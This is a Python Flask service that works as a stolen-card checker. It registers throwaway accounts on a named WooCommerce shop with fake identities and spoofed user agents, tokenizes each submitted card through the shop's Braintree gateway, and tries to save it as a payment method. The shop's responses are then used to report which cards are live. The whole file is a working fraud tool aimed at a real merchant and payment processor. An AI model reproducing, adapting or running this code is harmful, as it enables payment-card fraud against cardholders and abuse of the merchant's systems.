from flask import Flask, request, jsonify
import requests, base64, json, random, secrets
from faker import Faker
from fake_useragent import UserAgent
from faker.providers.phone_number import Provider

app = Flask(__name__)

class IndiaPhoneNumberProvider(Provider):
    def india_phone_number(self):
        return self.msisdn()[3:]

def main():
    fake = Faker()
    fake.add_provider(IndiaPhoneNumberProvider)
    return fake.india_phone_number()

def fre(P):
    correlationid = secrets.token_hex(16)
    r = requests.session()
    phone = main()
    fake = Faker()
    nm = fake.name().split(' ')
    first = nm[0]
    last = nm[1]
    ua = UserAgent()
    random_ua = ua.random
    response = requests.get('https://api.ipify.org?format=json')
    ip_data = response.json()
    my = ip_data['ip']
    cc = P.split('|')[0]
    if cc[0] == '3':
        return " Card Type Regected ❌"
    if cc[0] == '6':
        return " Card Type Regected ❌"
    exp = P.split('|')[1]
    exy = P.split('|')[2]
    try:
        exy = exy[2] + exy[3]
    except:
        pass
    cvv = P.split('|')[3].replace('\n', '')
    bin_num = cc[:6]
    em = "".join(random.choice('qwertyuiopasdfghjklzxcvbnm') for b in range(7))
    
    url = "https://www.fantinipelletteria.com/my-account/add-payment-method/"
    
    headers = {
        'User-Agent': random_ua,
        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        'cache-control': "max-age=0",
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': "?1",
        'sec-ch-ua-platform': '"Android"',
        'upgrade-insecure-requests': "1",
        'origin': "https://www.fantinipelletteria.com",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "navigate",
        'sec-fetch-user': "?1",
        'sec-fetch-dest': "document",
    }
    
    response = r.get(url, headers=headers)
    
    rg = response.text.split('woocommerce-register-nonce" value=')[1].split('"')[1]
    
    url = "https://www.fantinipelletteria.com/my-account/add-payment-method/"
    
    payload = {
        'email': f"{em}@hotmail.com",
        'password': f"AnA##{em}",
        'woocommerce-register-nonce': rg,
        '_wp_http_referer': "/my-account/add-payment-method/",
        'register': "Register"
    }
    
    headers = {
        'User-Agent': random_ua,
        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        'cache-control': "max-age=0",
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': "?1",
        'sec-ch-ua-platform': '"Android"',
        'upgrade-insecure-requests': "1",
        'origin': "https://www.fantinipelletteria.com",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "navigate",
        'sec-fetch-user': "?1",
        'sec-fetch-dest': "document",
    }
    
    response = r.post(url, data=payload, headers=headers)
    
    url = "https://www.fantinipelletteria.com/my-account/edit-address/billing/"
    
    headers = {
        'User-Agent': random_ua,
        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    }
    
    response = r.get(url, headers=headers, cookies=r.cookies)
    
    nonce1 = response.text.split('name="woocommerce-edit-address-nonce" value=')[1].split('"')[1]
    
    url = "https://www.fantinipelletteria.com/my-account/edit-address/billing/"
    
    payload = {
        'billing_country': "US",
        'billing_first_name': first,
        'billing_last_name': last,
        'billing_address_1': "new york",
        'billing_address_2': "",
        'billing_city': "new york",
        'billing_state': "NY",
        'billing_postcode': "10090",
        'billing_phone': phone,
        'billing_email': f"{em}@gmail.com",
        'save_address': "Save address",
        'woocommerce-edit-address-nonce': nonce1,
        '_wp_http_referer': "/my-account/edit-address/billing/",
        'action': "edit_address"
    }
    
    headers = {
        'User-Agent': random_ua,
        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        'cache-control': "max-age=0",
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': "?1",
        'sec-ch-ua-platform': '"Android"',
        'upgrade-insecure-requests': "1",
        'origin': "https://www.fantinipelletteria.com",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "navigate",
        'sec-fetch-user': "?1",
        'sec-fetch-dest': "document",
    }
    
    response = r.post(url, data=payload, headers=headers, cookies=r.cookies)
    
    url = "https://www.fantinipelletteria.com/my-account/add-payment-method/"
    
    headers = {
        'User-Agent': random_ua,
        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        'cache-control': "max-age=0",
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': "?1",
        'sec-ch-ua-platform': '"Android"',
        'upgrade-insecure-requests': "1",
        'origin': "https://www.fantinipelletteria.com",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "navigate",
        'sec-fetch-user': "?1",
        'sec-fetch-dest': "document",
    }
    
    response = r.get(url, headers=headers, cookies=r.cookies)
    nonce = response.text.split('name="woocommerce-add-payment-method-nonce" value=')[1].split('"')[1]
    aut = response.text.split(r'var wc_braintree_client_token')[1].split('"')[1]
    
    base4 = str(base64.b64decode(aut))
    auth = base4.split('"authorizationFingerprint":')[1].split('"')[1]
    
    url = "https://payments.braintree-api.com/graphql"
    
    payload = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": "6df73aa4-2fce-43eb-ba62-36f746cb4ea9"
        },
        "query": "query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT         cardinalSongbirdUrl         cardinalSongbirdIdentityHash       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     fastlane {       enabled       tokensOnDemand {         enabled         tokenExchange {           enabled         }       }     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment       enrichedCustomerDataEnabled    }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }",
        "operationName": "ClientConfiguration"
    }
    
    headers = {
        'User-Agent': random_ua,
        'Content-Type': "application/json",
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': "?1",
        'authorization': "Bearer " + auth,
        'braintree-version': "2018-05-10",
        'sec-ch-ua-platform': '"Android"',
        'origin': "https://www.fantinipelletteria.com",
        'sec-fetch-site': "cross-site",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://www.fantinipelletteria.com/",
        'accept-language': "en-US,en;q=0.9,ar;q=0.8"
    }
    
    response = requests.post(url, data=json.dumps(payload), headers=headers)
    googleauth = response.text.split('"cardinalAuthenticationJWT":')[1].split('"')[1]
    clb = response.text.split('"braintreeClientId":')[1].split('"')[1]
    clid = response.text.split('"clientId":')[1].split('"')[1]
    merchantId = response.text.split('"merchantId":')[1].split('"')[1]
    
    url = "https://payments.braintree-api.com/graphql"
    
    payload = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": "6df73aa4-2fce-43eb-ba62-36f746cb4ea9"
        },
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }",
        "variables": {
            "input": {
                "creditCard": {
                    "number": cc,
                    "expirationMonth": exp,
                    "expirationYear": exy,
                    "cvv": cvv,
                    "billingAddress": {
                        "postalCode": "10090",
                        "streetAddress": "new york"
                    }
                },
                "options": {
                    "validate": False
                }
            }
        },
        "operationName": "TokenizeCreditCard"
    }
    
    headers = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        'Content-Type': "application/json",
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': "?1",
        'authorization': "Bearer " + auth,
        'braintree-version': "2018-05-10",
        'sec-ch-ua-platform': '"Android"',
        'origin': "https://assets.braintreegateway.com",
        'sec-fetch-site': "cross-site",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://assets.braintreegateway.com/",
        'accept-language': "en-US,en;q=0.9,ar;q=0.8"
    }
    
    response = r.post(url, data=json.dumps(payload), headers=headers)
    
    tok = response.json()['data']['tokenizeCreditCard']['token']
    
    url = "https://api.braintreegateway.com/merchants/" + merchantId + "/client_api/v1/payment_methods/" + tok + "/three_d_secure/lookup"
    
    payload = {
        "amount": "0.00",
        "browserColorDepth": 24,
        "browserJavaEnabled": False,
        "browserJavascriptEnabled": True,
        "browserLanguage": "en-US",
        "browserScreenHeight": 854,
        "browserScreenWidth": 384,
        "browserTimeZone": -180,
        "deviceChannel": "Browser",
        "additionalInfo": {
            "ipAddress": my,
            "billingLine1": "new york",
            "billingLine2": "",
            "billingCity": "new york",
            "billingState": "NY",
            "billingPostalCode": "10090",
            "billingCountryCode": "US",
            "billingPhoneNumber": phone,
            "billingGivenName": first,
            "billingSurname": last,
            "email": f"{em}@gmail.com"
        },
        "bin": bin_num,
        "dfReferenceId": "",
        "clientMetadata": {
            "requestedThreeDSecureVersion": "2",
            "sdkVersion": "web/3.123.1",
            "cardinalDeviceDataCollectionTimeElapsed": 1163,
            "issuerDeviceDataCollectionTimeElapsed": 3211,
            "issuerDeviceDataCollectionResult": True
        },
        "authorizationFingerprint": auth,
        "braintreeLibraryVersion": "braintree/web/3.123.1",
        "_meta": {
            "merchantAppId": "www.fantinipelletteria.com",
            "platform": "web",
            "sdkVersion": "3.123.1",
            "source": "client",
            "integration": "custom",
            "integrationType": "custom",
            "sessionId": "6df73aa4-2fce-43eb-ba62-36f746cb4ea9"
        }
    }
    
    headers = {
        'User-Agent': random_ua,
        'Content-Type': "application/json",
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua-mobile': "?1",
        'origin': "https://www.fantinipelletteria.com",
        'sec-fetch-site': "cross-site",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://www.fantinipelletteria.com/",
        'accept-language': "en-US,en;q=0.9,ar;q=0.8"
    }
    
    response = r.post(url, data=json.dumps(payload), headers=headers)
    
    noncecc = response.json()['paymentMethod']['nonce']
    url = "https://www.fantinipelletteria.com/my-account/add-payment-method/"
    
    payload = {
        'payment_method': "braintree_cc",
        'braintree_cc_nonce_key': noncecc,
        'braintree_cc_device_data': '{"correlation_id":"' + correlationid + '"}',
        'braintree_cc_3ds_nonce_key': "",
        'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/' + merchantId + '/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/' + merchantId + '"},"merchantId":"' + merchantId + '","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["Maestro","UK Maestro","MasterCard","Visa"]},"threeDSecureEnabled":true,"threeDSecure":{"cardinalAuthenticationJWT":"' + googleauth + '","cardinalSongbirdUrl":"https://songbird.cardinalcommerce.com/edge/v1/songbird.js","cardinalSongbirdIdentityHash":null},"paypalEnabled":true,"paypal":{"displayName":"Fantini Pelletteria","clientId":"' + clid + '","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"' + clb + '","billingAgreementsEnabled":true,"merchantAccountId":"fantinipelletteriaukUSD","payeeEmail":null,"currencyIsoCode":"USD"}}',
        'woocommerce-add-payment-method-nonce': nonce,
        '_wp_http_referer': "/my-account/add-payment-method/",
        'woocommerce_add_payment_method': "1"
    }
    
    headers = {
        'User-Agent': random_ua,
        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        'cache-control': "max-age=0",
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': "?1",
        'sec-ch-ua-platform': '"Android"',
        'upgrade-insecure-requests': "1",
        'origin': "https://www.fantinipelletteria.com",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "navigate",
        'sec-fetch-user': "?1",
        'sec-fetch-dest': "document",
    }
    
    response = r.post(url, data=payload, headers=headers, cookies=r.cookies)
    try:
        msg = response.text.split('There was an error saving your payment method. Reason:')[1].split('<')[0] + " ❌"
        if 'Insufficient Funds' in msg:
            msg = 'Insufficient Funds ✅'
    except:
        msg = "APPROVED ✅"
    return msg

@app.route('/check', methods=['GET', 'POST'])
def check():
    try:
        if request.method == 'GET':
            card = request.args.get('cc', '')
        else:
            data = request.get_json()
            card = data.get('cc', '')
        
        if not card:
            return jsonify({'status': 'error', 'message': 'Missing cc parameter'})
        
        result = fre(card)
        
        if '✅' in result:
            status = 'approved'
        else:
            status = 'declined'
        
        return jsonify({
            'status': status,
            'message': result,
            'response': result,
            'card': card,
            'gateway': 'Braintree B3 1'
        })
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': str(e),
            'card': card if 'card' in locals() else ''
        })

@app.route('/', methods=['GET'])
def index():
    return jsonify({
        'service': 'Braintree Auth API',
        'version': 'B3 1 - Original Code',
        'usage': '/check?cc=CARD',
        'status': 'online'
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
